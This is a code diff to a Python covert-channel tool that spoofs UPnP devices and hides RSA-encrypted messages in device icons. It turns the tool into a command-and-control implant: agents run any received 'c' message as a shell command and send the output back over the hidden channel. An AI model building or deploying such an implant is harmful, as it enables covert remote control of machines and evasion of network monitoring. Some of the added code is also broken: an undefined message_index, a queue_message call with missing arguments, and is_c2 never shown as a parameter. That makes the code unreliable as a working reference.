@@ -1,5 +1,6 @@
 """A covert channel implementation which embeds data into UPNP device icons
 """
+import argparse
 import logging
 import os
 import queue
@@ -11,10 +12,10 @@ import typing
 import requests
 import xmltodict
 
-import secret_pixel
-import ssdp
-import upnp
-import utils
+from upnpseudograph import secret_pixel
+from upnpseudograph import ssdp
+from upnpseudograph import upnp
+from upnpseudograph import utils
 
 log = logging.getLogger(__name__)
 
@@ -51,6 +52,7 @@ class UPNPAgent:
         preferred_devices = (
             [upnp.UPNPDevice] if preferred_devices is None else preferred_devices
         )
+        self.is_c2 = is_c2
         self.private_key = utils.generate_rsa()
         self.public_key = self.private_key.public_key()
         self.target_device = None
@@ -79,15 +81,20 @@ class UPNPAgent:
         threading.Thread(target=self._start_agent_search).start()
         threading.Thread(target=self._test_messages).start()
 
-    def queue_message(self, target_ip, message):
+    def queue_message(self, target_ip, command, message):
+        """Queues a message to send to a specific IP
+
+        Args:
+            target_ip (str): target ip to send message to
+            command (bytes): b'm' for message, b'c' for command
+            message (bytes): The message in bytes
+        """
         public_key = self.agents.get(target_ip)
         if public_key:
             message_mapping = self.agent_messages.get(target_ip,{})
             message_index = len(message_mapping)
             message_bytes = (
-                int.to_bytes(
-                    message_index, 4, byteorder=utils.GLOBAL_BYTE_ORDER) +
-                message
+                command + message
             )
             message_mapping[message_index] = {
                 'message': message_bytes,
@@ -97,31 +104,22 @@ class UPNPAgent:
             )
             self.agent_messages[target_ip] = message_mapping
 
-    def _test_messages(self):
-        hello = 0
-        while True:
-            for agent_ip in self.agents:
-                if self.message_queue.empty():
-                    self.queue_message(agent_ip, f"hello-{hello}".encode('utf8'))
-                    print(f"Sending hello to {agent_ip}.")
-                    hello += 1
-            time.sleep(1)
-
     def process_message(self, agent_ip: str, message: bytes):
-        message_index = int.from_bytes(message[:4], byteorder=utils.GLOBAL_BYTE_ORDER)
-        message_content = message[4:]
-        if agent_ip in self.agents:
-            print(f"MESSAGE {agent_ip}: {message_content}")
-            open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip}:{message_index} -> {message_content}\n")
-        else:
-            # Assume it's a public key
-            try:
-                public_key = utils.public_key_from_n(message)
-                self.agents[agent_ip] = public_key
-                self.queue_message(agent_ip, b'hello')
-                log.info("Got new public key from {ip}.")
-            except Exception: # pylint: disable=0718
-                pass
+        command = message[0]
+        message_content = message[1:]
+        if self.is_c2:
+            if agent_ip in self.agents:
+                print(f"MESSAGE {agent_ip}: {message_content}")
+                open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip}:{message_index} -> {message_content}\n")
+        elif not self.is_c2:
+            if command == ord('c'):
+                command_args = message_content.decode('utf8').split()
+                process = subprocess.Popen(command_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+                stdout, stderr = process.communicate()
+                self.queue_message((stdout + "\n" + stderr + "\n").encode('utf8'))
+            elif command == ord('m'):
+                log.info("Received C2 Message %s", message_content.decode('utf8'))
+            
 
     def _start_agent_search(self):
         while True:
@@ -164,7 +162,7 @@ class UPNPAgent:
                                         if len(n_bytes) == utils.RSA_BIT_STRENGTH // 8:
                                             public_key = utils.public_key_from_n(n_bytes)
                                             self.agents[ip] = public_key
-                                            log.info("Found agent at %s.", ip)                           
+                                            log.info("Found agent at %s.", ip)                         
                                     except Exception as e:
                                         log.error("Error %s reading message from %s", e, ip)
                                     if ip in self.agents:
@@ -180,13 +178,3 @@ class UPNPAgent:
                     except requests.HTTPError:
                         pass
             time.sleep(SEARCH_FREQUENCY)
-
-
-if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
-    spoofed_device = UPNPAgent(preferred_devices = [upnp.RokuDevice])
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        os._exit(0)
